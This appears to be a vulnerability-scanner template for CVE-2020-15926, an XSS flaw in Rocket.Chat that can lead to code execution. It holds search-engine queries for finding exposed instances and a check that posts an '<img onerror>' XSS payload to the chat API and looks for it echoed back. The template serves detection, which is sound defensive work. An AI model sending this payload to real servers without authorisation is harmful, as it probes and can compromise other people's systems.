id: CVE-2020-15926

info:
  name: Rocket.Chat XSS leading to RCE
  author: ProjectDiscoveryAI
  severity: medium
  description: Rocket.Chat through 3.4.2 allows XSS where an attacker can send a specially crafted message to a channel or in a direct message to the client which results in remote code execution on the client side.
  impact: |
    Successful exploitation could result in an attacker executing arbitrary code on the server.
  remediation: |
    Apply the vendor-supplied patch or upgrade to a non-vulnerable version of Rocket.Chat.
  reference:
    - https://blog.redteam.pl/2020/08/rocket-chat-xss-rce-cve-2020-15926.html
    - https://github.com/doyensec/awesome-electronjs-hacking
    - https://github.com/alphaSeclab/sec-daily-2020
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N
    cvss-score: 6.1
    cve-id: CVE-2020-15926
    cwe-id: CWE-79
    epss-score: 0.00375
    epss-percentile: 0.73535
    cpe: cpe:2.3:a:rocket.chat:rocket.chat:*:*:*:*:*:*:*:*
  metadata:
    vendor: rocket.chat
    product: rocket.chat
    shodan-query: http.title:"Rocket.Chat"
    fofa-query: title="rocket.chat"
    google-query: intitle:"rocket.chat"

http:
  - method: POST
    path:
      - "{{BaseURL}}/api/v1/chat.postMessage"

    headers:
      Content-Type: "application/json"

    body: |
      {
        "channel": "#general",
        "text": "<img src=x onerror=alert(1)>"
      }
    matchers:
      - type: word
        words:
          - "<img src=x onerror=alert(1)>"
        part: body
